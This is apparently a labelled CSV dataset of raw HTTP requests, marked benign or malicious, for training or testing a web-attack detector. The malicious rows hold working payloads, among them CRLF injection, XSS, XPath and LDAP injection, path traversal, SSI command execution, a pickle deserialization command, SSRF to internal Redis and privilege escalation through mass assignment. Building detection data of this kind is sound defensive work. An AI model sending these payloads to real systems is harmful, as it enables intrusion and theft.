label,text
malicious,"PUT /api/v5/redirect HTTP/1.1
Host: tech-support-helpdesk.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: application/json, text/plain
Accept-Language: en-US,en;q=0.6
Content-Type: application/json
Content-Length: 280
Referer: https://tech-support-helpdesk.ai/dashboard
Cookie: auth_token=token12345abcdef67890

{""redirect_url"": ""/helpdesk/home%0d%0aContent-Type:%20text/html%0d%0aLocation:%20http://phishing.tech-support-helpdesk.ai%0d%0a%0d%0a<html><body>Redirecting...</body></html>""}"
malicious,"GET /download/latest-release HTTP/1.1
Host: secure-file-transfer-protocol.org
User-Agent: Mozilla/5.0 <style>body{background:url(""javascript:alert('LogViewerXSS')"")}</style> AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Accept: */*
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Cache-Control: no-cache"
malicious,"POST /app/v1/catalog/query HTTP/1.1
Host: smart-solutions-cloud.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
Accept: text/xml,application/xml
Content-Type: application/xml
Content-Length: 146
Origin: https://dashboard.smart-solutions-cloud.ai

<searchRequest><term>' or '1'='1' or name()='</term><category>gadgets</category></searchRequest>"
benign,"PUT /api/settings/general HTTP/1.1
Host: dashboard-admin-panel.pro
If-Match: ""d5f8a237-12af-46af-a7e2-961f4f6b060a""
Content-Type: application/x-www-form-urlencoded
Authorization: Basic YWRtaW46c2VjdXJlcGFzcw==
Accept-Language: en-US,en;q=0.7
User-Agent: Python-urllib/3.10
Content-Length: 48
Connection: close

email_notifications=off&maintenance_mode=enabled&max_login_attempts=5"
benign,"POST /account/settings/privacy HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 214
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: session_token=ghk485nlqm39n2vh4m3kplr7

email_notifications=enabled&two_factor=disabled&notes=%3Csettings%3EPrivacy+level+set+to+medium%3C%2Fsettings%3E"
benign,"GET /public/v1/static/css/print-style.css HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/css,*/*;q=0.1
Referer: https://community.game-dev-forum.org/thread/12345/page/2
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:91.0) Gecko/20100101 Firefox/91.0"
benign,"POST /files/upload HTTP/1.1
Host: secure-user-portal.net
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Content-Type: multipart/form-data; boundary=--uploadboundary321
Accept-Encoding: gzip

----uploadboundary321
Content-Disposition: form-data; name=""upload""; filename=""site-index.txt""
Content-Type: text/plain

Site index for crawling purposes.
----uploadboundary321--"
benign,"PUT /api/library/books/6438 HTTP/1.1
Host: digital-book-loft.info
Authorization: Bearer fKztL30sdR38kMC0byYGqPhTkgxSC19ejewBoULyxN0
Content-Type: application/json
Accept: application/json
User-Agent: curl/7.87.0
Content-Length: 293

{""bookId"":6438,""title"":""The Art of Urban Gardening"",""author"":""Mercedes Tanaka"",""publishedYear"":2021,""genres"":[""horticulture"",""urban lifestyle""],""availability"":{""digital"":true,""print"":true,""audiobook"":false},""metadata"":{""pages"":322,""isbn"":""978-1-4028-9462-6""}}"
benign,"GET /search?q=wireless+headphones&category=audio HTTP/1.1
Host: shopathon.online:4567
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Referer: https://shopathon.online/"
benign,"POST /blog/comments/add HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Connection: keep-alive

comment=Thanks+for+explaining+how+to+use+WHERE+clauses+effectively+in+a+SELECT+statement,+very+helpful+post!"
benign,"GET /articles/travel-tips/europe-spring-2024 HTTP/1.1
Host: wanderlust-adventures.net
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, br
Referer: https://wanderlust-adventures.net/articles
Connection: close"
benign,"GET /robots.txt HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close"
malicious,"POST /app/user/profile/update HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Python-urllib/3.9
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Cookie: language_file=../../../../usr/local/apache/conf/httpd.conf%00txt; auth=eyJhbGciOiJIUzI1NiJ9

username=johndoe&about=Hello%20world"
benign,"POST /upload/image HTTP/1.1
Host: photoshare-secure.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZyx81aJ1CfOErH5P
Origin: https://photoshare-secure.io
Referer: https://photoshare-secure.io/upload
Cookie: sessionid=4b9f8aeca1d47e83ab2c5c1d7fab3f26; csrftoken=9e7b5a1a4f8d90f1
Content-Length: 312
Connection: keep-alive

------WebKitFormBoundaryZyx81aJ1CfOErH5P
Content-Disposition: form-data; name=""caption""

Vacation in Spain
------WebKitFormBoundaryZyx81aJ1CfOErH5P
Content-Disposition: form-data; name=""album_id""

5962
------WebKitFormBoundaryZyx81aJ1CfOErH5P
Content-Disposition: form-data; name=""image_file""; filename=""photo123.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------WebKitFormBoundaryZyx81aJ1CfOErH5P--"
benign,"GET /reviews/details?comment=This%20is%20%26lt%3Bbold%26gt%3B HTTP/1.1
Host: product-reviews-hub.biz
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
DNT: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Connection: keep-alive
Cache-Control: no-cache"
benign,"GET /events/calendar?year=2024&month=9&callback=processData HTTP/1.1
Host: city-events-guide.org
Accept: application/javascript, */*;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Cache-Control: max-age=3600
Referer: https://city-events-guide.org/homepage"
benign,"GET /robots.txt HTTP/1.1
Host: global-archive-vault.info
User-Agent: ArchiveSpiderBot/6.0 (+https://global-archive-vault.info/crawler)
Accept: text/plain, */*
Cache-Control: max-age=0
Connection: keep-alive"
benign,"PUT /api/data/item123 HTTP/1.1
Host: enterprise-logger.co
Accept-Encoding: gzip, deflate
Content-Type: text/plain
User-Agent: curl/7.85.0
Content-Length: 24
Connection: close

Log entry: task completed"
benign,"POST /services/api/v1/scripts/realtime-update.js HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: python-requests/2.28.2
Content-Type: application/javascript
Content-Length: 36
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: keep-alive

console.log('Realtime update script ready');"
benign,"DELETE /api/v1/users/50321 HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
If-Match: ""a1b2c3d4e5""
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive"
malicious,"POST /api/v2/submit HTTP/1.1
Host: fast-track-logistics.net
User-Agent: Wget/1.21.1%0d%0aInjected-Header:%20InjectedValue
Content-Type: application/json
Accept: application/json
Content-Length: 52

{""shipmentId"":""SH123456"",""status"":""delivered""}"
benign,"POST /upload/avatar HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyO0yzW3vE6YvLq5H
Content-Length: 302
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Connection: keep-alive
Referer: https://my-personal-blog-site.info/settings/profile

------WebKitFormBoundaryyO0yzW3vE6YvLq5H
Content-Disposition: form-data; name=""upload""; filename=""profilepic.jpg""
Content-Type: image/jpeg

...placeholder for JPEG image binary content...
------WebKitFormBoundaryyO0yzW3vE6YvLq5H--"
benign,"HEAD /downloads/games/space_adventure_setup_64bit.exe HTTP/1.1
Host: nextgen-gaming.zone
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: */*
Pragma: no-cache
Cache-Control: no-cache
Connection: keep-alive"
malicious,"POST /app/user/settings HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://online-retail-store.biz/app/user/settings
User-Agent: Mozilla/5.0 (Linux; Android 11; MoT-AX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36
Sec-CH-UA: ""Google Chrome"";v=""92"", "" Not A;Brand"";v=""99"", ""Chromium"";v=""92""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Android""
Content-Length: 180

{""settings"": {""custom_html"": ""<!--#exec cmd=\""c$(echo a)t /etc/hos$(echo t)name\""-->""}, ""extra"": true}"
benign,"GET /img/svg/logo-negative.svg HTTP/1.1
Host: secure-user-portal.net
Accept: image/svg+xml,image/*
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Referer: https://secure-user-portal.net/home
DNT: 1
Connection: keep-alive"
benign,"GET /forum/threads/view?forum_id=15&thread_id=29475&sort=latest_post&filter=unread&include_op=true&page=1&per_page=20&highlight_user=obscura87&show_signature=true&show_avatars=false&display_mode=compact&lang=en HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
DNT: 1"
benign,"POST /auth/login HTTP/1.1
Host: accounts.my-personal-blog-site.info
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Android 12; Mobile; rv:102.0) Gecko/102.0 Firefox/102.0
Referer: https://accounts.my-personal-blog-site.info/login
Accept-Language: en-US,en;q=0.5
Content-Length: 38

username=jessica.martz&password=securePa$$123"
benign,"POST /api/log HTTP/1.1
Host: edu-learning-platform.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: application/json
Content-Type: application/json
Content-Length: 341
Cache-Control: max-age=0
Connection: keep-alive
Origin: https://edu-learning-platform.org

{""activity"":{""type"":""quiz_completed"",""quiz"":{""id"":""qz5391"",""title"":""Introduction to Microeconomics"",""score"":88,""maxScore"":100,""questionsAnswered"":20},""timestamp"":""2024-06-12T13:56:09Z""},""user"":{""userId"":""student9943"",""enrolledCourses"":[""economics101"",""statistics100""]},""device"":{""browser"":""Chrome"",""os"":""macOS 12.6.3""}}"
benign,"POST /form/submit HTTP/1.1
Host: tech-support-portal.io
User-Agent: Python-urllib/3.11
Content-Type: application/x-www-form-urlencoded
Content-Length: 138
Accept: */*
Connection: close
X-CSRF-Token: f89251d3a7b942f28e5e112c3f40a6f8

contact_name=Roberto+Gomez&email=roberto.gomez%40tech-support-portal.io&description=After+a+complex+JOIN,+I+used+UNION+and+SELECT+to+compare+results+FROM+two+data+sets."
malicious,"POST /api/data/persist HTTP/1.1
Host: enterprise-analytics-platform.co
Content-Type: application/json
Content-Length: 295
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1
Origin: https://analytics.enterprise-analytics-platform.co
X-Requested-With: FetchAPIClient
Accept: application/json
Accept-Language: en-US,en;q=0.7

{""reportId"": ""rpt_9328475"", ""metrics"": {""clicks"": 1290, ""impressions"": 4520}, ""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""flag_value"", ""timestamp"": ""2024-06-05T11:35:20Z""}"
benign,"GET /profiles/%D0%B8%D0%B3%D1%80%D0%BE%D0%BA HTTP/1.1
Host: gamerhub-community.online
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Accept-Encoding: gzip, deflate
Referer: https://gamerhub-community.online/home"
benign,"GET /docs/api/v4/users/list HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
X-Forwarded-For: 192.168.172.20
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Connection: keep-alive
Accept-Language: en-US,en;q=0.9
Pragma: no-cache"
benign,"POST /api/upload/finance/report HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: application/json
Accept-Encoding: gzip, deflate, br
Content-Type: text/csv
Content-Length: 94
Connection: keep-alive
Authorization: Bearer T0k3nReAl1234567890SampleToken
X-CSRF-Token: 1abf87c297b4936f8e2c1ba1f2056342

month,revenue,expenses
January,103000,75000
February,98000,67000
March,112000,69000"
benign,"GET /stylesheets/main.css HTTP/1.1
Host: interactive-learning-platform.edu
User-Agent: Wget/1.19.5 (linux-gnu)
Accept: text/css,*/*;q=0.1
Accept-Language: en-US,en;q=0.7
Connection: close"
malicious,"POST /api/v1/redirect/trigger HTTP/1.1
Host: user-session-gateway.net
Content-Type: application/json
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Referer: https://user-session-gateway.net/app/dashboard
Origin: https://user-session-gateway.net
Content-Length: 59
Connection: keep-alive

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Content-Length: 210
Connection: keep-alive
X-Requested-With: XMLHttpRequest

payload_b64=TzozMToiUnVzdEV4cGVyaWVuY2VcQmFjcGVidWdpIjoyOntzOjY6ImtleSI7czoyMzoic2V0dGluZ3MiO3M6MTI6InByb2ZpbGVfaWQiO2k6NDI7fQ=="
benign,"GET /images/logo.svg HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept: image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Referer: https://community.game-dev-forum.org/forums/general-discussion
Connection: keep-alive"
benign,"GET /products/gadgets/wireless-earbuds/details HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp
Cookie: cart_id=78345ds87f; session_token=kjh234234jkh2; prefs_lang=en-US
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Referer: https://online-retail-store.biz/products/gadgets"
benign,"GET /reports/daily?exec=fetch_summary&date=2024-06-05 HTTP/1.1
Host: data-insights-center.net
User-Agent: Mozilla/5.0 (Linux; U; Android 10; en-US; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
benign,"POST /avatar/update HTTP/1.1
Host: interactive-learning-platform.edu
User-Agent: Python-urllib/3.11
Accept-Encoding: identity
Content-Type: multipart/form-data; boundary=----LearningBoundary007
Content-Length: 351
Cookie: sessionid=al0jdbkzya48yq737
Connection: keep-alive

------LearningBoundary007
Content-Disposition: form-data; name=""image_file""; filename=""student_avatar.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------LearningBoundary007
Content-Disposition: form-data; name=""caption""

Updated avatar for course profile
------LearningBoundary007--"
malicious,"POST /api/v2/ldapsearch HTTP/1.1
Host: connect-valuespace.net
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 56

user_id=validuser%29%28objectClass%3D*%29&attributes=%2A"
benign,"HEAD /community/forums/topic/45238 HTTP/1.1
Host: social-sphere-hub.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: text/html
Accept-Encoding: gzip, deflate
Connection: close"
benign,"GET /api/v2/events/upcoming?category=music HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
X-Forwarded-For: 52.15.100.22
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/15.1 Safari/604.1"
malicious,"POST /auth/token/refresh HTTP/1.1
Host: secure-auth-service.auth-gateway.org
User-Agent: Python-requests/2.25.1
Accept: application/json, text/javascript
X-Payload-Pickle: \x80\x04\x95\x2b\x00\x00\x00\x00\x00\x00\x00cos\nbuiltins\neval\n\x94\x8c\x28__import__('os').system('id')\x94\x93\x94.\r
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

token=MTIzNDU2Nzg5&refresh=true"
benign,"POST /api/v1/users/profile/image HTTP/1.1
Host: media-storage.cloud-photo-hub.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Length: 234
Connection: keep-alive

{""userId"": ""c4fdee11-87ae-4570-a972-ee3f9ec8fdf6"", ""imageData"": ""iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBwYWludC5uZXQgNC4wLjE2Q1VTNUI5NgAAAJBJREFUOE9j/M/AwPCfgP4z8DAv6UENfiHi8ABMR+PnyHhgAfXgIVPzw/iywyMTCxAvL7AwP/wExGO4gQG/i4DYJzGLFYr0wESMDH/Ie/A4mAIAyYsAMXuLcQ9DA/6UBdASdgjkYwMAwA6XnkWHypvtXwAAAABJRU5ErkJggg==""}"
benign,"GET /robots.txt HTTP/1.1
Host: digital-marketing-experts.co
User-Agent: curl/7.85.0
Accept: */*
User-Agent: curl/7.85.0
Connection: close"
benign,"GET /members/janedoe/posts HTTP/1.1
Host: urbanconnect.social
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Referer: https://urbanconnect.social/members/janedoe
Cookie: login_token=5a3b1c7ea9f445d48570e8d7db8a21a3; prefs=font_size:medium
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.121 Safari/537.36"
benign,"POST /oauth/token HTTP/1.1
Host: auth-secure-gateway.ai
Content-Type: application/x-www-form-urlencoded
Authorization: Basic Y2xpZW50QXI6c2VjdXJlU2VjcmV0MTIz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Content-Length: 123

grant_type=authorization_code&code=3a1b9f2d7c&redirect_uri=https%3A%2F%2Fapp.auth-secure-gateway.ai%2Fcallback&client_id=clientAr&client_secret=secureSecret123"
benign,"DELETE /v1/calendar/events/e8f7a6b4c3 HTTP/1.1
Host: productivity-suite-services.dev
Authorization: Bearer v6pzs1wok2cn89xy7qlurb5fejtdm3ga4
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Accept: application/json
Connection: keep-alive"
malicious,"PATCH /api/account/update HTTP/1.1
Host: member-area.cloud-digitalnet.ai
Content-Type: application/json
X-CSRF-Token: 7b8c32c41d094832b27ae7842f42dfa1
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Origin: https://member-area.cloud-digitalnet.ai
Referer: https://member-area.cloud-digitalnet.ai/profile/edit
Pragma: no-cache

{
  ""email"": ""amelia.rose@cloud-digitalnet.ai"",
  ""username"": ""amel.rose"",
  ""is_admin"": true,
  ""subscription_level"": ""gold""
}"
malicious,"POST /submit/url HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Cache-Control: no-cache
Content-Length: 54

fetch_data=gopher://internal-redis:6379/_%20%E0%B8%AD%E0%B8%B0%E0%B9%84%E0%B8%A3%E0%B8%81%E0%B9%87%E0%B8%94"
benign,"POST /submit/comment HTTP/1.1
Host: community.creative-writers.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Connection: keep-alive
Referer: https://community.creative-writers.net/forum/topic/2453

username=jessica_h&comment=%3Cnote%3EThank+you+for+the+helpful+feedback.%3C%2Fnote%3E&postId=2453"
benign,"GET /news/local/today HTTP/1.1
Host: daily-townbuzz.io
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://weather-center-hub.net/
Cookie: session_id=ab12cd34ef56gh78ij90kl
DNT: 1
Sec-CH-UA: ""Chromium"";v=""114"", ""Google Chrome"";v=""114"", "";Not A Brand"";v=""99""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Windows"""
benign,"POST /api/v1/feedback HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer aeu73nd12mPz9QrZt6GXHeL67pK3WxJj
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Content-Length: 94
Connection: close

{""feedback.message"":""Great content!"",""user.details['country']"":""FR"",""meta.time-submitted"":""2024-06-04T18:33:22Z""}"
benign,"DELETE /api/v1/accounts/4598 HTTP/1.1
Host: api.fin-trackers.net
Authorization: Bearer qweRty98uioPasdFghJkl
If-Match: ""a1b2c3d4""
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive"
benign,"PUT /api/devices/1809 HTTP/1.1
Host: iot-management-platform.cloud
Authorization: Bearer token_67go89lkh3nkjdh7fvd9823jf
Content-Type: application/json
Accept: application/json
User-Agent: Python-urllib/3.11
Connection: close
Content-Length: 140

{""deviceId"":1809,""name"":""Weather Sensor Alpha"",""location"":""Greenhouse 5"",""status"":""active"",""metrics"":{""temperature"":24.3,""humidity"":39}}"
malicious,"POST /api/v4/cart/add HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Content-Length: 237
Cookie: session_token=1f9d2e4a8bcc72a3bd8ec960c2fb7834

{""product_redirect"": ""/cart/view%0d%0aPragma:%20no-cache%0d%0aLocation:%20http://faked-checkout.online-retail-store.biz%0d%0a%0d%0a<html>Fake Checkout Page</html>""}"
benign,"GET /community/api/posts/search?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://community.game-dev-forum.org/forums/general-discussion"
malicious,"POST /session/start HTTP/1.1
Host: enterprise-app-solutions.tech
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Content-Length: 80
Connection: keep-alive
Cookie: sid=3e2f1a4b5c6d7e8f9a0b1c2d3e4f5a6b

username=manager' and substring(concat(//employees/employee[1]/pin,'#'),1,1)='9&password=topsecret"
